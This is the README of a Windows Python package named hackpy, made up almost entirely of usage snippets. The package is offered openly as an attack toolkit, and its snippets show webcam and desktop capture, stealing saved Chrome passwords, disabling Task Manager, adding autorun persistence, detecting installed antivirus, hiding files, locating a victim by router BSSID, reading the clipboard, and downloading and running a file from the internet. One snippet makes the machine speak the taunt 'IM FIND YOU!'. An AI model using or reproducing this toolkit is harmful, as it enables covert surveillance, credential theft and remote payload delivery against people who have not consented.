![Python](https://www.python.org/static/img/python-logo@2x.png)
# `pip install hackpy` :bomb:

# Example usage:
``` python
# Warning! This module working only on Windows systems!
# Import module
import hackpy

```

# Get user and system information
![SystemInfo](https://i.ibb.co/b3gmsxg/hackpy-System-Info.png)
``` python
print(
    '\nWelcome to HackPy!\n'                  +
    '\nUsername: '     + hackpy.userInfo      +
    '\nVersion: '      + hackpy.versionInfo   +
    '\nRelease: '      + hackpy.releaseInfo   +
    '\nSystem: '       + hackpy.systemInfo    +
    '\nNode: '         + hackpy.nodeInfo      +
    '\nMachine: '      + hackpy.machineInfo   +
    '\nProcessor: '    + hackpy.processorInfo +
    '\nPlatform: '     + hackpy.platformInfo  +
    '\nArchitecture: ' + hackpy.architectureInfo[0]
    )
```

# Webcam screenshot
``` python
hackpy.webcamScreenshot(filename = 'screenshot.png', delay = 4500, camera = 1)
```

# Desktop screenshot
``` python
hackpy.desktopScreenshot(filename = 'desktop.png')
```

# TaskManager
``` python
# If process iexplore.exe found:
if hackpy.taskmanager('iexplore.exe').find():
    # Stop iexplore.exe process
    hackpy.taskmanager('iexplore.exe').kill() 
    # start firefox.exe process
    hackpy.taskmanager('firefox.exe').start()
    
# Return dictonary with all processes
for process in hackpy.taskmanager.list(): 
    print(process)

# Disable windows taskmgr.exe
hackpy.taskmanager.disable()
# Enable windows taskmgr.exe
hackpy.taskmanager.enable() 
```

# Autorun
``` python
# Add cmd.exe to startup
hackpy.autorun('C:\\Windows\\System32\\cmd.exe').install()

# Remove cmd.exe from startup
hackpy.autorun('C:\\Windows\\System32\\cmd.exe').uninstall()
```

# Check if program running as admin
``` python
if (hackpy.isAdmin()): # return True if program started as admin
    print('Program started as admin! Loading cmd.exe')
    status = hackpy.file.startAsAdmin('cmd.exe') # return true in [0] if all is okay and message in [1]
    print('Okay, debugMessage:', status[1])

else:
    print('Program started as user!')
```

# Simple file control
``` python
hackpy.file.exists('file.txt')                # Return True or False
hackpy.file.remove('file.txt')                # Remove file
hackpy.file.rename('file.txt', 'newfile.txt') # Rename file
hackpy.file.copy('file.txt', 'C:\\Windows')   # Copy file
hackpy.file.scan('C:\\')                      # Return all files in directory
hackpy.file.start('file.txt')                 # Start file 
hackpy.file.startAsAdmin('file.txt')          # Start file as admin
hackpy.file.atributeHidden('file.txt')        # Hide file
hackpy.file.atributeNormal('file.txt')        # Show file
```

# Detect installed antivirus software on computer:
``` python 
data = hackpy.detectProtection()
for antivirus in data:
    print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])
```

# Ping
``` python
target = 'google.com'
if hackpy.ping(target):         # return True  if target is online
    print(target + ' is online!') 
else:
    print('Failed to connect!') # return False if target not found
```

# Get ip by url
``` python
target = 'google.com'
ip     = hackpy.getHostByName(target) # return '172.217.16.14'

print('IP: ' + ip)
```


# Get mac address by local ip
``` python
target = '192.168.1.1'
mac    = hackpy.getmac(target) # return 'XX:XX:XX:XX:XX:XX' 

print('mac: ' + mac)
```

# Port scanner
``` python
target = 'youtube.com'
port   = '80'
if hackpy.portIsOpen(target, port):
    print('Port ' + port + ' is opened!')
else:
    print('Port ' + port + ' is closed!')
```

# Information about you IP:
``` python
data = hackpy.whois()
print('[?] - You IP is: ' + data['query'])
print('[?] - You live in: ' + data['country'] + ', country code: ' + data['countryCode'])
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as", "local"}

# Information about other IP:
data = hackpy.whois('216.58.215.110')
print('[?] - Other Information about IP:\n' + str(data))
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as"}

# Get geodata about you IP:
data = hackpy.geoplugin()
print('[?] - Latitude: ' + data['geoplugin_latitude'])
# Return dict: {"geoplugin_request", "geoplugin_status", "geoplugin_delay", "geoplugin_credit", "geoplugin_city", "geoplugin_region", "geoplugin_regionCode", "geoplugin_regionName", "geoplugin_areaCode", "geoplugin_dmaCode", "geoplugin_countryCode", "geoplugin_countryName", "geoplugin_inEU", "geoplugin_euVATrate", "geoplugin_continentCode", "geoplugin_continentName", "geoplugin_latitude", "geoplugin_longitude", "geoplugin_locationAccuracyRadius", "geoplugin_timezone", "geoplugin_currencyCode", "geoplugin_currencySymbol", "geoplugin_currencySymbol_UTF8", "geoplugin_currencyConverter"}
```

# Get router bssid:
``` python
# Get router BSSID
bssid_string = hackpy.router()
# Find LATITUDE and LONGITUDE with router BSSID:
data = hackpy.bssid_locate(bssid_string)
print(
    'RANGE     : ' + str(data['range']) + '\n' +
    'LATITUDE  : ' + str(data['lat'])   + '\n' +
    'LONGITUDE : ' + str(data['lon'])   + '\n'
    )
```

# Windows messagebox:
``` python

# MB_OK
# MB_OK_CANCEL
# MB_ABORTRETRYIGNORE
# MB_YES_NO_CANCEL
# MB_YES_NO
# MB_RETRYCANCEL
# MB_CANCELTRYCONTINUE
# MB_HELP

# ICON_ERROR
# ICON_QUESTION
# ICON_WARNING
# ICON_INFORMATION

# MB_TOPMOST

hackpy.messagebox('text', 'title')
hackpy.messagebox('text', 'title', settings=['ICON_WARNING', 'MB_RETRYCANCEL', 'MB_TOPMOST'])
```

# Change desktop wallpaper:
```python 
image = 'C:\\users\\Admin\\wallpaper.png'
hackpy.setWallpaper(image) # BETA
```

# Nircmdc commands
![SITE](https://i.ibb.co/znRLN0D/image.png)
``` python
# You can run nircmdc commands in python
hackpy.command.nircmdc('monitor off')
hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
# Nircmdc reference: https://nircmd.nirsoft.net
```

# System commands
``` python
hackpy.command.system('shutdown -s -t 260')
```

# Passwords recovery
![SITE](https://i.ibb.co/nnjYFxV/hackpy-passwords-Recovery.png)
Working only with Chrome!
``` python
hackpy.passwords import *

for key, account in passwordsRecovery().items():
    print(
        '\n['  + str(key) + ']'
        '\n|____ site: ' + account['url'] + 
        '\n |___ user: ' + account['login'] + 
        '\n  |__ pass: ' + account['password']
        )
```

# Mouse, Windows control
``` python
import hackpy.activity

hackpy.activity.getActiveWindow() # Return active window title
hackpy.activity.userIsActive()    # return True if user move mouse. Return False if not | BETA!!!
hackpy.activity.setCursorPos(100, 100) # x, y
hackpy.activity.getCursorPos() # return  x, y
```

# Time
``` python
import hackpy.time as time

# Get first time
firstTime  = time.time()
# Sleep program for 3 secounds
time.sleep(3)
# Get last time
secondTime = time.time()

print('Code executed. Time elapsed: ' + str(round(secondTime - firstTime)) + ' secounds.')

# Get current time
time.date.day() # day, month, year, hour, minute, secound and all.
print('Now ' + time.date.year() + ' year!')
```

# SendKeyPress:
``` python
hackpy.sendKey('Hello bro{ENTER}')
# Other keys: https://pastebin.com/Ns3P7UiH
```

# Clipboard
``` python
import hackpy.clipboard

# Get text from clipboard:
data = hackpy.clipboard.get()
print('Text in clipboard is ' + data)
# Set text to clipboard:
hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
```

# Download python and install it:
``` python
# Check if python installed on system. False - not installed, True - installed.
if not hackpy.python.check(): 
    print('Python is not installed, trying to install!')
    # Default version is 3.7.0 and install path is C:\python37
    hackpy.python.install('3.6.0', path = 'C:\\python36') 
else:
    print('Python is installed!')
```

# Load and run file from internet
``` python
# Download file
file = hackpy.wget(url)
# Start file
hackpy.file.start(file)
```

# Power
``` python
hackpy.power.reboot()     # Reboot
hackpy.power.shutdown()   # Shutdown
hackpy.power.logoff()     # Logoff
hackpy.power.hibernate()  # Hibernate
```